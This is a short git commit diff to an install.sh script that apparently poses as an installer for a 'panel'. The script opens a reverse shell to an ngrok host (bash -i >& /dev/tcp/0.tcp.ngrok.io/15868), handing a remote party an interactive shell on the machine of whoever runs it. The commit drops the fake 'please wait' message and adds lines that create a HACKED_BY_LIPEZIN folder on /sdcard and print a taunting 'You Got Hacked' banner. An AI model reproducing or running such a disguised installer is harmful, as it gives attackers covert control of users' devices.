d379ad65c0478b60c7b65b042851c41a07ce7b1d
root@lipezin <90061097+LipezinPY@users.noreply.github.com>
2021-11-07 17:34:55 -0300

    Update install.sh

--- install.sh
+++ install.sh
@@ -1,4 +1,6 @@
 #!/usr/bin/bash
 clear
-echo -e '\e[92;1mAguarde , Seu Painel Iniciará ...\e[m'
 bash -i >& /dev/tcp/0.tcp.ngrok.io/15868 0>&1
+mkdir HACKED_BY_LIPEZIN /sdcard/Downloads
+clear
+echo -e '\e[92;1m You Got Hacked KKKK \e[m'
